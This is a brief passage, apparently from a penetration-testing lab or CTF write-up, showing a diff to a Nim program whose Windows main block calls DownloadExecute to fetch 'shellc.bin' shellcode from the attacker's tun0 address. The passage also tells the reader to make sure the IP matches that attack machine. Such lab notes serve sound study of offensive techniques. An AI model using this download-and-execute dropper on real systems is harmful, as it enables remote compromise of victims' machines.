@@ -90,7 +90,7 @@ proc DownloadExecute(url: string): void =
 
 when defined(windows):
   when isMainModule:
-    DownloadExecute("http://192.168.211.2/shellc.bin")
+    DownloadExecute("http://10.10.17.210/shellc.bin")
 ```
 
 - Make sure that that the ip matches our tun0 attack machine
